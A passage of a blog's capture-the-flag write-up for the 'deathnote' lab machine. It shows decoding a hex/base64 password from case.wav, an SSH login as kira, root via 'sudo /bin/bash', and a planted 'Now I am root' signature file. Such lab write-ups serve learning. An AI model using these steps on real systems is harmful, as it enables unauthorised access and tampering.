+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> fake-notebook-rule
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> kira-case
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L$ cd fake-notebook-rule
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L/fake-notebook-rule$ ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">84</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> <span style="color:#66d9ef">case</span>.wav
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">15</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> hint
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L/fake-notebook-rule$ cat hint
+</span></span><span style="display:flex;"><span>use cyberchef
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L/fake-notebook-rule$ cd ..
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L$ ls
+</span></span><span style="display:flex;"><span>fake-notebook-rule  kira-case
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L$ cd kira-case
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L/kira-case$ ls
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span>-file.txt
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L/kira-case$ cat <span style="color:#66d9ef">case</span>-file.txt
+</span></span><span style="display:flex;"><span>the FBI agent died on December 27, <span style="color:#ae81ff">2006</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> week after the investigation of the task-force member/head.
+</span></span><span style="display:flex;"><span>aka.....
+</span></span><span style="display:flex;"><span>Soichiro Yagami<span style="color:#960050;background-color:#1e0010">&#39;</span>s family .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hmmmmmmmmm......
+</span></span><span style="display:flex;"><span>and according to watari ,
+</span></span><span style="display:flex;"><span>he died as other died after Kira targeted them .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>and we also found something in 
+</span></span><span style="display:flex;"><span>fake-notebook-rule folder .
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L/kira-case$ cd ..
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L$ ls
+</span></span><span style="display:flex;"><span>fake-notebook-rule  kira-case
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L$ cd fake-notebook-rule
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L/fake-notebook-rule$ ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">84</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> <span style="color:#66d9ef">case</span>.wav
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">15</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> hint
+</span></span><span style="display:flex;"><span>l@deathnote:/opt/L/fake-notebook-rule$ cat <span style="color:#66d9ef">case</span>.wav
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">63</span> <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">46</span> 7a <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">64</span> 6b <span style="color:#ae81ff">49</span> <span style="color:#ae81ff">44</span> 6f <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">32</span> 6c <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">57</span> 6c 7a 5a <span style="color:#ae81ff">58</span> 5a <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">41</span> 3d
+</span></span></code></pre></div><p>I crack the <code>case.wav</code> with <code>CyberChef</code> (From Hex, From base64) and I find the password:</p>
+<pre tabindex="0"><code>passwd : kiraisevil 
+</code></pre><p>I find the kira&rsquo;s credentials:</p>
+<pre tabindex="0"><code>kira:kiraisevil
+</code></pre><p>I do the login:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh kira@10.0.0.2 
+</span></span><span style="display:flex;"><span>kira@10.0.0.2<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux deathnote 4.19.0-17-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.194-2 (2021-06-21) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Sat Sep  <span style="color:#ae81ff">4</span> 06:00:09 <span style="color:#ae81ff">2021</span> from 127.0.0.1
+</span></span><span style="display:flex;"><span>kira@deathnote:~$ ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> kira kira <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> kira kira    <span style="color:#ae81ff">0</span> Sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2021</span> .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kira kira  <span style="color:#ae81ff">220</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kira kira <span style="color:#ae81ff">3526</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bashrc
+</span></span><span style="display:flex;"><span>-rwx------ <span style="color:#ae81ff">1</span> kira root   <span style="color:#ae81ff">85</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> kira.txt
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> kira kira <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kira kira  <span style="color:#ae81ff">807</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .profile
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> kira kira <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .ssh
+</span></span><span style="display:flex;"><span>kira@deathnote:~$ cat kira.txt
+</span></span><span style="display:flex;"><span>cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
+</span></span><span style="display:flex;"><span>kira@deathnote:~$ 
+</span></span></code></pre></div><p>I crack kira.txt with <code>CyberChef</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>please protect one of the following 
+</span></span><span style="display:flex;"><span>1. L <span style="color:#f92672">(</span>/opt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>2. Misa <span style="color:#f92672">(</span>/var<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I <code>spawn</code> the <code>root shell</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>kira@deathnote:~$ sudo /bin/bash
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kira: 
+</span></span><span style="display:flex;"><span>root@deathnote:/home/kira# cd /root
+</span></span><span style="display:flex;"><span>root@deathnote:~# cat root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: 
+</span></span><span style="display:flex;"><span>    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: 
+</span></span><span style="display:flex;"><span>   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         
+</span></span><span style="display:flex;"><span>  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   
+</span></span><span style="display:flex;"><span> +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##########follow me on twitter###########3</span>
+</span></span><span style="display:flex;"><span>and share this screen shot and tag @KDSAMF
+</span></span><span style="display:flex;"><span>root@deathnote:~# 
+</span></span></code></pre></div><h2 id="patch-the-machine-vulnerabilities">Patch the machine vulnerabilities<a href="#patch-the-machine-vulnerabilities" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I change all the permess that they generate the privilege escalation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@deathnote:~# chmod a<span style="color:#f92672">=</span>-r-w-x /opt/L/fake-notebook-rule/case.wav
+</span></span><span style="display:flex;"><span>---------- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">84</span> Aug <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2021</span> /opt/L/fake-notebook-rule/case.wav
+</span></span></code></pre></div><p>I leave my <code>signature</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>root@deathnote:~# cd /home/l/
+</span></span><span style="display:flex;"><span>root@deathnote:/home/l# touch README.txt
+</span></span><span style="display:flex;"><span>root@deathnote:/home/l# echo <span style="color:#e6db74">&#34;CyberSpider  has been here, Now I am root :)&#34;</span> &gt; README.txt
+</span></span><span style="display:flex;"><span>root@deathnote:/home/l# chmod a<span style="color:#f92672">=</span>+r-w-x README.txt
+</span></span><span style="display:flex;"><span>root@deathnote:/home/l# ls -all
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">856</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> l    l      <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">12</span> 17:43 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> l    l       <span style="color:#ae81ff">741</span> Feb <span style="color:#ae81ff">12</span> 16:52 .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> l    l       <span style="color:#ae81ff">220</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> l    l      <span style="color:#ae81ff">3526</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bashrc
+</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> l    l    <span style="color:#ae81ff">828145</span> Feb <span style="color:#ae81ff">12</span> 16:03 linpeas.sh
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> l    l      <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .local
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> l    l       <span style="color:#ae81ff">342</span> Feb <span style="color:#ae81ff">12</span> 17:20 .mysql_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> l    l       <span style="color:#ae81ff">807</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .profile
+</span></span><span style="display:flex;"><span>-r--r--r-- <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">45</span> Feb <span style="color:#ae81ff">12</span> 17:44 README.txt
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> l    l      <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2021</span> .ssh
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">512</span> Jul <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> user.txt
+</span></span><span style="display:flex;"><span>root@deathnote:/home/l# 
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/chocolate_factory/">
+                <span class="button__text">THM Writeup - Chocolate Factory (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
